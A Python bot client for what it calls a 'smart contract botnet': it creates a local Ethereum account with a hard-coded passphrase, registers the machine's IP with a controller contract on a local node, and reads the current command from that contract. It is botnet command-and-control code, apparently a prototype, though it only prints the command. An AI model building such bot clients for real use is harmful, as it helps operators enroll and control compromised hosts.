import argparse
import json
import socket
from web3 import Web3, HTTPProvider

PROVIDER = "http://127.0.0.1:8545"
ABI_DIRECTORY = "../build/contracts/Controller.json"
LOCAL_ACCOUNT = "account.json"
W3 = Web3(HTTPProvider(PROVIDER))


class Bot(object):
    """
    Our bot to interact with the smart contract
    
    Attributes:
        account (Account): the local Account of this bot
        contract_address (string): the address of the main contract
        contract (Contract): a Contract object that we can use to access functions
    """
    
    def __init__(self, contract_address):
        self.contract_address = contract_address
        self.init_account()
        self.ip = get_ip()

        with open(ABI_DIRECTORY) as f:
            info_json = json.load(f)
            abi = info_json["abi"]
            self.contract = W3.eth.contract(address=self.contract_address, abi=abi)

    def retrieve_command(self):
        """
        Gets most recent command from contract
        
        Returns:
            command (string): the current command stored in our contract
        """
        return self.contract.functions.get_command().call()

    def join_network(self):
        """
        Joins this bot to the network
        """
        is_joined = self.contract.functions.is_joined().call()
        if is_joined:
            print("Bot already joined network")
            return
        
        W3.personal.unlockAccount(self.account, self.pass_phrase, duration=15)
        tx_hash = self.contract.functions.join(self.ip).transact()
        tx_reciept = W3.eth.waitForTransactionReceipt(tx_hash)
        print(tx_reciept)
    
    def init_account(self):
        """
        Retrieves account info from LOCAL_ACCOUNT file. Will create a new account
        if that file is not present.
        """
        try:
            with open(LOCAL_ACCOUNT) as file:
                account_info = json.load(file)
                self.account = account_info['address']
                self.pass_phrase = account_info['pass_phrase']

        except IOError:
            with open(LOCAL_ACCOUNT, 'w') as file:
                self.pass_phrase = "dosh"
                self.account = W3.personal.newAccount(self.pass_phrase)
                account_info = dict()
                account_info["address"] = self.account
                account_info["pass_phrase"] = self.pass_phrase
                json.dump(account_info, file, indent=4)

        W3.eth.defaultAccount = self.account



def get_ip():
    """
    Gets the IP of the local machine

    Returns:
        ip (string): the ip of the local machine
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('8.8.8.8', 1))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    
    return ip


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Interacts with our smart contract botnet', add_help=True)
    parser.add_argument('-a', dest='address', help='The address of the contract', required=True)
    args = parser.parse_args()

    contract_address = args.address
    bot = Bot(contract_address)

    bot.join_network()

    command = bot.retrieve_command()
    print(command)

